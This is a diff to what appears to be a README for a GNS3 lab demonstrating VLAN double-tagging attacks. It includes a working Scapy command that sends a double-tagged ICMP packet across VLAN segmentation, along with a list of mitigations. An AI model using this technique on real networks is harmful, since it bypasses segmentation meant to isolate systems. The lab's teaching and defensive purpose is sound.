@@ -31,7 +31,7 @@ The **ATTACKER** machine is a Docker container. The imaged used in this lab is [
 ![Attacker Interfaces](assets/attacker-interfaces.png)
 
 ### Cisco IOS
-**SWITCH1** and **SWITCH2** are virtual Cisco IOS Layer 2 devices. You can use either the IOSvL2 or IOU L2 GNS3 appliance templates for this lab. They should work as standard switches 'out of the box', no configurations necessary.
+**SWITCH1** and **SWITCH2** are virtual Cisco IOS Layer 2 devices. You can use either the IOSvL2 or IOU L2 GNS3 appliance templates for this lab. They should work as standard switches 'out of the box', no configurations necessary. Note that since these are virtualized appliances, they may not behave exactly like their hardware counterparts.
 
 ## Verify Connectivity
 CAMERA_01 should be able to ping CENTRAL_SERVER.
@@ -139,17 +139,15 @@ As can be seen, the ICMP echo requests never reach CENTRAL_SERVER.
 ![](assets/wireshark-server-segmentation.png)
 
 ## Exploit
-Craft a double-tagged ICMP packet with Scapy
+Craft a double-tagged ICMP echo request packet with Scapy. The outer tag should reflect the native VLAN to be stripped by the first switch (`vlan=1`), while the inner tag will be where our target resides (`vlan=20`).
 
 <pre>
   >>> packet = Ether(dst='ff:ff:ff:ff:ff:ff')/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.0.250')/ICMP()
   >>> sendp(packet, iface="eth0")
-  .
-  Sent 1 packets.
 </pre>
 
 ## Mitigations
-You can prevent double-tagging attacks by:
+Double tagging attacks can be mitigated by:
 - Setting the native VLAN to an unused VLAN
 - Forcing all trunks to tag all traffic (i.e., vlan dot1q tag native)
 - Avoiding VLAN 1 for any user-access ports
